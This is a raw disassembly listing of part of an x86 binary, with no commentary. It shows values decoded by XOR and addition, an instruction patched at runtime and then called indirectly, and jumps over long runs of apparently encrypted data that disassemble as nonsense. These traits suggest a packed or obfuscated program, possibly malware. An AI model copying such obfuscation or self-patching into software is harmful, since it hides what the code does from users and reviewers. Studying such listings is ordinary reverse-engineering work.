  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41595f:	mov    esp,0x106d4bf2
  415964:	jg     0x4159de
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x415908
  41596b:	addr16 cld 
  41596d:	out    0xa1,eax
  41596f:	mov    esp,DWORD PTR [edx+0x5041cc4c]
  415975:	popa   
  415976:	fs aaa 
  415978:	imul   eax,esp,0xffffff9b
  41597b:	mov    bh,0x59
  41597d:	pop    edx
  41597e:	push   ebp
  41597f:	aam    0x44
  415981:	stos   DWORD PTR es:[edi],eax
  415982:	adc    eax,0x86e31d5b
  415987:	call   0xfaf9ef96
  41598c:	call   0x1dcd:0x1b9cbd7f
  415993:	ja     0x4159c9
  415995:	push   eax
  415996:	addr16 test al,0x50
  415999:	arpl   WORD PTR [ebp+0x51c6feed],bx
  41599f:	xchg   ecx,eax
  4159a0:	dec    ebx
  4159a1:	xchg   edi,eax
  4159a2:	mov    WORD PTR [ebp-0x27d9902e],?
  4159a8:	loop   0x415a00
  4159aa:	imul   ebx,DWORD PTR [ecx+0x7f],0xffffffb6
  4159ae:	icebp  
  4159af:	add    dh,BYTE PTR [edi-0x25]
  4159b2:	or     al,0xc9
  4159b4:	dec    edx
  4159b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159b6:	xor    al,0x92
  4159b8:	sbb    eax,0x72b72b1e
  4159bd:	dec    ecx
  4159be:	mov    WORD PTR [edx+0x10],cs
  4159c1:	mov    edx,0x7cc0fcf0
  4159c6:	loop   0x41598a
  4159c8:	ret    0x6978
  4159cb:	adc    edx,DWORD PTR [eax]
  4159cd:	xlat   BYTE PTR ds:[ebx]
  4159ce:	xor    BYTE PTR [edi+0x463e564],bl
  4159d4:	mov    bl,0xc1
  4159d6:	aam    0x5
  4159d8:	jle    0x415a2e
  4159da:	les    esp,FWORD PTR [eax-0x71]
  4159dd:	in     al,0xf6
  4159df:	addr16 pop es
  4159e1:	clc    
  4159e2:	mov    esp,0x1b595829
  4159e7:	imul   BYTE PTR [eax]
  4159e9:	int3   
  4159ea:	jnp    0x4159f1
  4159ec:	or     al,0x44
  4159ee:	scas   al,BYTE PTR es:[edi]
  4159ef:	xchg   edx,eax
  4159f0:	imul   ebp,edi,0xffffffce
  4159f3:	mov    bh,0xfc
  4159f5:	mov    edi,0xb7d9e8e5
  4159fa:	dec    ecx
  4159fb:	sub    BYTE PTR [esi],al
  4159fd:	iret   
  4159fe:	dec    eax
  4159ff:	jecxz  0x4159c9
  415a01:	into   
  415a02:	(bad)  
  415a04:	mov    bh,0xa5
  415a06:	inc    edi
  415a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a08:	call   0x3308:0x60e43039
  415a0f:	xor    esi,DWORD PTR [edi]
  415a11:	(bad)  
  415a12:	ret    0x55f
  415a15:	pop    esp
  415a16:	loop   0x4159c2
  415a18:	popa   
  415a19:	xor    eax,0x57ebf6c5
  415a1e:	stos   BYTE PTR es:[edi],al
  415a1f:	cdq    
  415a20:	or     DWORD PTR [esi+0x66],esi
  415a23:	test   BYTE PTR [eax-0x5fa09260],al
  415a29:	fsubr  DWORD PTR [eax-0x41515777]
  415a2f:	sub    DWORD PTR [ebp+0x797b0b0d],edi
  415a35:	cmp    ebx,ecx
  415a37:	mov    dl,0xbd
  415a39:	sti    
  415a3a:	imul   ebx,DWORD PTR [ebp-0x4639f38d],0xcd3ed68b
  415a44:	mov    BYTE PTR [bx],dl
  415a47:	dec    esi
  415a48:	pop    edi
  415a49:	and    cl,dl
  415a4b:	xor    bl,al
  415a4d:	mov    dh,0xf8
  415a4f:	mov    esp,0x2722e033
  415a54:	cs jecxz 0x415ac1
  415a57:	test   al,0xfc
  415a59:	lahf   
  415a5a:	pop    es
  415a5b:	fcmovnu st,st(2)
  415a5d:	or     esp,DWORD PTR [ebx+0x135d7995]
  415a63:	sti    
  415a64:	pop    esi
  415a65:	inc    eax
  415a66:	popf   
  415a67:	pop    ebx
  415a68:	or     bh,BYTE PTR ss:[eax+0x6a3276f9]
  415a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a70:	jmp    0x5b200ac5
  415a75:	cmp    ebp,DWORD PTR gs:[ebx-0x3]
  415a79:	and    eax,0x112c9d21
  415a7e:	adc    ch,BYTE PTR [edx+0x46]
  415a81:	dec    edx
  415a82:	shl    ecx,cl
  415a84:	js     0x415a1c
  415a86:	ret    0x7c90
  415a89:	mov    bl,0xb8
  415a8b:	sbb    al,0x31
  415a8d:	push   ds
  415a8e:	dec    edx
  415a8f:	jae    0x415ade
  415a91:	mov    ah,0xf5
  415a93:	in     eax,0xab
  415a95:	cmp    ch,ah
  415a97:	ficomp DWORD PTR [edx-0x27]
  415a9a:	dec    ebx
  415a9b:	adc    dh,BYTE PTR [ebp+0x54154ea5]
  415aa1:	popa   
  415aa2:	and    BYTE PTR [edx-0x1db89a4],al
  415aa8:	fsubr  DWORD PTR [eax]
  415aaa:	dec    edi
  415aab:	add    eax,0xccb8d832
  415ab0:	inc    esp
  415ab1:	popa   
  415ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab3:	dec    edx
  415ab4:	dec    ebp
  415ab5:	push   es
  415ab6:	inc    ebx
  415ab7:	mov    eax,0x35e23101
  415abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415abd:	bound  ebp,QWORD PTR [eax]
  415abf:	fiadd  WORD PTR [ebx]
  415ac1:	loop   0x415a8f
  415ac3:	and    al,0xe7
  415ac5:	or     DWORD PTR [edx+0x20],edx
  415ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ac9:	gs dec edx
  415acb:	dec    edi
  415acc:	cmp    esi,DWORD PTR [eax+0x3aa69cd9]
  415ad2:	jl     0x415af0
  415ad4:	dec    ebp
  415ad5:	icebp  
  415ad6:	cmp    BYTE PTR [ebx+ebx*4+0x79612fc8],dh
  415add:	test   DWORD PTR [ebx],0x662c0821
  415ae3:	fldenv [eax]
  415ae5:	cwde   
  415ae6:	inc    edx
  415ae7:	dec    edx
  415ae8:	shl    ebx,0x54
  415aeb:	ret    0x86da
  415aee:	repnz mov al,ds:0x681354d2
  415af4:	add    eax,0x9e75f948
  415af9:	dec    edx
  415afa:	or     BYTE PTR [edi],cl
  415afc:	adc    DWORD PTR [eax],ebx
  415afe:	cmp    edi,edx
  415b00:	add    al,al
  415b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b03:	jae    0x415ada
  415b05:	adc    DWORD PTR [esi+0x67dc1d5],eax
  415b0b:	and    DWORD PTR ds:0x45a117d0,esp
  415b11:	mov    eax,0xd32b642e
  415b16:	sub    ebp,DWORD PTR [ecx-0x16df2477]
  415b1c:	or     esi,ecx
  415b1e:	jecxz  0x415b3d
  415b20:	jne    0x415aa9
  415b22:	je     0x415ba1
  415b24:	call   0x6e554432
  415b29:	mov    WORD PTR [edx+0x56],cs
  415b2c:	pop    edx
  415b2d:	xor    DWORD PTR [esi-0x77],esi
  415b30:	dec    DWORD PTR [eax-0x507f2c7e]
  415b36:	jo     0x415b3c
  415b38:	xor    DWORD PTR [ebx+0x6c659a7b],esp
  415b3e:	mov    al,ds:0xb6716d02
  415b43:	dec    edx
  415b44:	and    eax,0x22b6e325
  415b49:	in     al,dx
  415b4a:	jo     0x415b15
  415b4c:	inc    edi
  415b4d:	pop    edi
  415b4e:	sbb    DWORD PTR [esi],esp
  415b50:	jg     0x415b92
  415b52:	fisub  DWORD PTR [edi+0x35a7daa8]
  415b58:	cmp    al,0x13
  415b5a:	call   DWORD PTR [edx+ebx*1]
  415b5d:	lahf   
  415b5e:	dec    ebp
  415b5f:	or     BYTE PTR [ebx+0x6b],dh
  415b62:	or     DWORD PTR [edx],edi
  415b64:	icebp  
  415b65:	mov    ebx,0xf0cc32f
  415b6a:	cdq    
  415b6b:	xor    dh,dh
  415b6d:	iret   
  415b6e:	fst    QWORD PTR [edx]
  415b70:	push   0xffffffcc
  415b72:	or     BYTE PTR [ecx-0x2801a701],dl
  415b78:	outs   dx,BYTE PTR ds:[esi]
  415b79:	les    edi,FWORD PTR [ebp+0x7a03f5]
  415b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b80:	xchg   DWORD PTR ds:0x5d17f4bf,eax
  415b86:	push   eax
  415b87:	and    ecx,0x49
  415b8a:	dec    ebx
  415b8b:	sub    DWORD PTR ds:0xf1f49712,0x70eae04
  415b95:	mov    ah,0xb2
  415b97:	xor    DWORD PTR [ebp-0x745f82ac],esi
  415b9d:	sar    BYTE PTR [ecx],cl
  415b9f:	pop    es
  415ba0:	jg     0x415b42
  415ba2:	bnd jae 0x415b7e
  415ba5:	push   esp
  415ba6:	and    al,0x88
  415ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ba9:	jne    0x415b72
  415bab:	add    cl,dh
  415bad:	jle    0x415be0
  415baf:	or     edx,DWORD PTR [ecx]
  415bb1:	mov    bl,0x6a
  415bb3:	mov    BYTE PTR [ebx-0x4d237c2],ch
  415bb9:	mov    dl,0x9d
  415bbb:	mov    eax,ds:0x3c78d6a5
  415bc0:	fs or  DWORD PTR es:[esp+ecx*4+0x36],esp
  415bc6:	xchg   esi,eax
  415bc7:	cld    
  415bc8:	mov    ah,0xa0
  415bca:	push   ebx
  415bcb:	cs inc edi
  415bcd:	dec    esp
  415bce:	pop    eax
  415bcf:	or     eax,0xb2a6ae5b
  415bd4:	cmp    BYTE PTR [edi+0x4b],bh
  415bd7:	push   esi
  415bd8:	mov    al,0xca
  415bda:	lea    esi,[ecx]
  415bdc:	or     al,0xff
  415bde:	fcomp  QWORD PTR [eax-0x2e]
  415be1:	aas    
  415be2:	push   0x631f7427
  415be7:	dec    ebx
  415be8:	stos   BYTE PTR es:[edi],al
  415be9:	dec    edi
  415bea:	out    0xfd,eax
  415bec:	dec    esp
  415bed:	push   cs
  415bee:	bnd jb 0x415bc2
  415bf1:	jns    0x415c49
  415bf3:	jno    0x415c24
  415bf5:	call   0x7df72b45
  415bfa:	or     al,0x58
  415bfc:	(bad)  
  415bfd:	fistp  DWORD PTR [eax]
  415bff:	ins    BYTE PTR es:[edi],dx
  415c00:	or     BYTE PTR [ebx+0x51463434],dh
  415c06:	push   ecx
  415c07:	mov    DWORD PTR ds:0x42aa55,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42aa19,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42aadd,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	xchg   esi,eax
  415c40:	sti    
  415c41:	aad    0xee
  415c43:	mov    dl,BYTE PTR ds:0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	sar    al,1
  415c4d:	fwait
  415c4e:	test   eax,0x2e44a16c
  415c53:	pop    edi
  415c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c55:	nop
  415c56:	push   DWORD PTR [edx+0x78]
  415c59:	xor    esp,DWORD PTR [eax]
  415c5b:	pop    ebx
  415c5c:	(bad)  
  415c5d:	dec    BYTE PTR [edx]
  415c5f:	call   0x9c59b43f
  415c64:	inc    edx
  415c65:	add    DWORD PTR [esi-0x24],edi
  415c68:	pop    ss
  415c69:	inc    edx
  415c6a:	push   cs
  415c6b:	lds    edx,FWORD PTR [ebx-0x64]
  415c6e:	jmp    0x415c82
  415c70:	dec    ebx
  415c71:	cmovne eax,esp
  415c74:	push   edi
  415c75:	or     eax,eax
  415c77:	mov    dl,0xe
  415c79:	(bad)  
  415c7a:	in     eax,dx
  415c7b:	dec    esp
  415c7c:	shl    dh,cl
  415c7e:	dec    esi
  415c7f:	push   bp
  415c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c82:	outs   dx,DWORD PTR ds:[esi]
  415c83:	test   DWORD PTR [ebp+edi*8-0x5094ccd6],edi
  415c8a:	dec    ebp
  415c8b:	cmp    DWORD PTR [ebp-0x3c9f7764],esi
  415c91:	ja     0x415c7d
  415c93:	(bad)  
  415c95:	fs jg  0x415cee
  415c98:	and    al,0xe
  415c9a:	stos   DWORD PTR es:[edi],eax
  415c9b:	mov    ebx,0x4a9725c1
  415ca0:	lods   al,BYTE PTR ds:[esi]
  415ca1:	adc    DWORD PTR [esi],0xffffffde
  415ca4:	fscale 
  415ca6:	jg     0x415c9b
  415ca8:	repnz xor eax,0xa9151152
  415cae:	outs   dx,BYTE PTR ds:[esi]
  415caf:	push   edi
  415cb0:	(bad)  
  415cb1:	test   DWORD PTR [esi],ebp
  415cb3:	ret    0x7652
  415cb6:	fidiv  WORD PTR [eax+0x6d]
  415cb9:	or     esi,DWORD PTR [ecx+0x5b]
  415cbc:	ins    DWORD PTR es:[edi],dx
  415cbd:	or     DWORD PTR [eax+0x27],ebp
  415cc0:	clc    
  415cc1:	inc    ecx
  415cc2:	xor    edi,DWORD PTR [eax-0x134f3852]
  415cc8:	out    0x91,eax
  415cca:	mov    ebp,0xa5714a82
  415ccf:	cdq    
  415cd0:	adc    dh,ch
  415cd2:	pop    eax
  415cd3:	out    0xab,al
  415cd5:	cmp    ebp,esp
  415cd7:	fcmovbe st,st(7)
  415cd9:	pop    edi
  415cda:	fistp  QWORD PTR [ebp+eax*2+0x7b]
  415cde:	je     0x415d2c
  415ce0:	std    
  415ce1:	pop    ss
  415ce2:	(bad)  
  415ce3:	sar    cl,cl
  415ce5:	or     DWORD PTR [edx-0x4ee238e2],ebx
  415ceb:	cmp    DWORD PTR [edi-0x4ad255a5],edx
  415cf1:	js     0x415d50
  415cf3:	mov    edi,DWORD PTR [edi-0x70]
  415cf6:	fisub  WORD PTR [edx-0x4c]
  415cf9:	inc    esi
  415cfa:	cmp    eax,0x3ecdb8b1
  415cff:	and    eax,0x86e4c0be
  415d04:	cmp    BYTE PTR [edi],ch
  415d06:	xor    eax,0x58
  415d09:	jmp    0x10840c5e
  415d0e:	test   BYTE PTR [edx-0x32],ah
  415d11:	cmp    al,0x79
  415d13:	adc    dh,bh
  415d15:	or     esp,0xb6110c7e
  415d1b:	daa    
  415d1c:	mov    fs,WORD PTR [esi+ebx*1+0x6f392735]
  415d23:	pop    esi
  415d24:	sbb    eax,0x77bc13e7
  415d29:	mov    bh,0x77
  415d2b:	mov    bl,0x8d
  415d2d:	in     eax,dx
  415d2e:	push   esp
  415d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d30:	aaa    
  415d31:	jge    0x415d13
  415d33:	cmp    eax,0xbf32b444
  415d38:	or     DWORD PTR [bx+si+0xc79],esp
  415d3d:	ret    
  415d3e:	add    ah,BYTE PTR [ecx-0xe]
  415d41:	ret    0xf575
  415d44:	sub    al,BYTE PTR [edi+ebx*2]
  415d47:	push   ds
  415d48:	retf   
  415d49:	pop    eax
  415d4a:	daa    
  415d4b:	pushw  0x72
  415d4e:	shl    DWORD PTR [ebx+0x6],1
  415d51:	xlat   BYTE PTR ds:[ebx]
  415d52:	mov    ds:0xe05dbb46,al
  415d57:	fdiv   QWORD PTR [edx+edx*1]
  415d5a:	sbb    edx,DWORD PTR [ebx+0x37]
  415d5d:	fsub   DWORD PTR [ebp+ebx*4-0x3259f11]
  415d64:	repz ds jns 0x415dbe
  415d68:	xchg   edx,eax
  415d69:	dec    ebx
  415d6a:	dec    edx
  415d6b:	into   
  415d6c:	stos   BYTE PTR es:[edi],al
  415d6d:	test   ebx,esi
  415d6f:	aaa    
  415d70:	outs   dx,DWORD PTR ds:[esi]
  415d71:	out    dx,eax
  415d72:	aaa    
  415d73:	jle    0x415d70
  415d75:	aam    0x8e
  415d77:	mov    esi,0xb91be502
  415d7c:	pop    eax
  415d7d:	xor    al,0xb5
  415d7f:	test   eax,0x9034b99a
  415d84:	pop    ebx
  415d85:	fnstcw WORD PTR [esi]
  415d87:	mov    dl,0x11
  415d89:	push   0x28
  415d8b:	in     eax,0xb6
  415d8d:	je     0x415d8e
  415d8f:	frndint 
  415d91:	in     al,0x0
  415d93:	mov    bh,0x6
  415d95:	das    
  415d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d97:	inc    esi
  415d98:	in     eax,dx
  415d99:	mov    cl,0xb3
  415d9b:	fist   WORD PTR [esi-0x17]
  415d9e:	pop    ds
  415d9f:	ins    BYTE PTR es:[edi],dx
  415da0:	cdq    
  415da1:	imul   DWORD PTR [ecx-0x61e00fa2]
  415da7:	imul   ebx,DWORD PTR [edx],0xc8f3fb52
  415dad:	sti    
  415dae:	in     eax,dx
  415daf:	pop    ds
  415db0:	sub    bl,0xbd
  415db3:	fdivr  st,st(4)
  415db5:	xlat   BYTE PTR ss:[ebx]
  415db7:	pop    esi
  415db8:	pop    esi
  415db9:	jmp    0xbca26d93
  415dbe:	mov    dl,0xfa
  415dc0:	loopne 0x415e1f
  415dc2:	push   ebx
  415dc3:	push   0x14
  415dc5:	jbe    0x415dfc
  415dc7:	iret   
  415dc8:	popf   
  415dc9:	out    0x42,eax
  415dcb:	jg     0x415d53
  415dcd:	push   0x1ac76cbb
  415dd2:	rcr    BYTE PTR [ecx+edx*8-0x7e],cl
  415dd6:	add    cl,ah
  415dd8:	or     bl,dl
  415dda:	in     al,0x45
  415ddc:	repz data16 in al,dx
  415ddf:	repz hlt 
  415de1:	xchg   edx,eax
  415de2:	cmp    BYTE PTR [edi-0x37],ah
  415de5:	and    esp,edx
  415de7:	js     0x415dd1
  415de9:	std    
  415dea:	(bad)  
  415deb:	mov    ebx,0x9294f731
  415df0:	jno    0x415dd9
  415df2:	or     al,0x77
  415df4:	aas    
  415df5:	outs   dx,DWORD PTR ds:[esi]
  415df6:	sub    BYTE PTR [eax+0x6a],ch
  415df9:	scas   al,BYTE PTR es:[edi]
  415dfa:	xchg   ebp,eax
  415dfb:	icebp  
  415dfc:	call   0xba93:0x2d71bde6
  415e03:	lods   eax,DWORD PTR ds:[esi]
  415e04:	jp     0x415e78
  415e06:	retf   0x340a
  415e09:	and    BYTE PTR [edx+edi*2+0x12],bh
  415e0d:	add    eax,0x8e7b08f9
  415e12:	clc    
  415e13:	shl    ecx,cl
  415e15:	push   eax
  415e16:	enter  0xd131,0x98
  415e1a:	std    
  415e1b:	inc    DWORD PTR [eax+ebx*1-0x79]
  415e1f:	jae    0x415e74
  415e21:	or     al,0x9e
  415e23:	dec    ecx
  415e24:	test   bh,al
  415e26:	push   0xb176ee41
  415e2b:	pop    esi
  415e2c:	mov    bh,0x43
  415e2e:	pop    esp
  415e2f:	popa   
  415e30:	test   bh,0xbd
  415e33:	std    
  415e34:	out    0xe9,eax
  415e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e37:	xor    DWORD PTR [edi],0xffffffac
  415e3a:	(bad)  
  415e3c:	dec    ebp
  415e3d:	jl     0x415dc4
  415e3f:	test   al,0x7b
  415e41:	fisttp DWORD PTR [edx+0xf58cf1f]
  415e47:	inc    esp
  415e48:	sti    
  415e49:	dec    ebx
  415e4a:	call   0x1b37931
  415e4f:	cmp    eax,0xc4bbc799
  415e54:	lock push ss
  415e56:	jo     0x415e7d
  415e58:	mov    WORD PTR [edx],cs
  415e5a:	xor    ebp,DWORD PTR [ebp-0x1c7ce074]
  415e60:	shr    edx,0xc6
  415e63:	xor    al,0x74
  415e65:	xchg   DWORD PTR [eax*4+0x24eda4f2],edi
  415e6c:	data16 (bad) 
  415e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e6f:	push   ebp
  415e70:	pop    ecx
  415e71:	repnz ds and eax,0x4e860a8a
  415e78:	out    dx,al
  415e79:	out    0x0,eax
  415e7b:	mov    cl,0xa8
  415e7e:	sub    DWORD PTR [ebx+esi*4],edi
  415e81:	ins    BYTE PTR es:[edi],dx
  415e82:	sbb    eax,0x2a5648db
  415e87:	xchg   ebp,eax
  415e88:	pop    ebx
  415e89:	ins    DWORD PTR es:[edi],dx
  415e8a:	mov    bl,0x49
  415e8c:	sub    BYTE PTR [ebx-0x3c],dl
  415e8f:	or     al,0xa2
  415e91:	dec    edi
